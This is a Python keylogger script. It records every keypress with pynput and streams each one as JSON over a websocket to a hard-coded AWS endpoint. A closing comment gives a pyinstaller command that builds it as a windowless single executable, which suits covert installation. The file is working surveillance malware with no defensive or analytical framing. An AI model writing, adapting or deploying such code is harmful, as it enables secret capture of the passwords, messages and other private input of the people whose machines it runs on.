import os, asyncio, websockets, threading, json
from pynput import keyboard

WEBSOCKET_URL = "wss://jlm2boqqb7.execute-api.us-east-1.amazonaws.com/banana/"
queue = asyncio.Queue()
websocket = None

special_keys = [keyboard.Key.backspace, keyboard.Key.space]

# A thread-safe queue to communicate between the synchronous and asynchronous parts

def on_press(key):
    try:
        asyncio.run_coroutine_threadsafe(queue.put(key.char), loop)
    except AttributeError:
        # print(key)
        if key in special_keys:
            asyncio.run_coroutine_threadsafe(queue.put(str(key)), loop)

async def handle_key_events():
    while True:
        key = await queue.get()
        print(f'Handling key {key}', end="\r")
        # Perform your asynchronous operations here
        await send_key_stroke(key)
        queue.task_done()
        
async def connect_to_socket():
    global websocket
    websocket = await websockets.connect(WEBSOCKET_URL)
        
async def send_key_stroke(stroke):
    global websocket
    if websocket is not None:
        try:
            socket_obj = json.dumps({"action": "sendStroke","stroke": stroke})
            await websocket.send(socket_obj)
            print(f"Sent message: {stroke}")
        except (websockets.ConnectionClosedError, websockets.InvalidStatusCode):
            print("Connection is closed, reconnecting...")
            await connect_to_socket()  # Reconnect if the connection is lost
            await websocket.send(stroke)  # Resend the message after reconnecting
    else:
        print("WebSocket is not connected. Trying to reconnect...")
        asyncio.run(connect_to_socket())
        asyncio.run(websocket.send(stroke))

def run_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        print("in")
        listener.join()

async def main():
    global loop
    # init websocket conn
    await connect_to_socket()
    print("In")
    loop = asyncio.get_running_loop()

    # Start the asyncio task to handle key events
    asyncio.create_task(handle_key_events())

    # Start the keyboard listener in a separate thread
    listener_thread = threading.Thread(target=lambda: keyboard.Listener(on_press=on_press).start())
    listener_thread.start()

    # Keep the main coroutine running to keep the event loop alive
    while True:
        await asyncio.sleep(1)
    

if __name__ == "__main__":
    asyncio.run(main())


# pyinstaller --noconsole --onefile main.py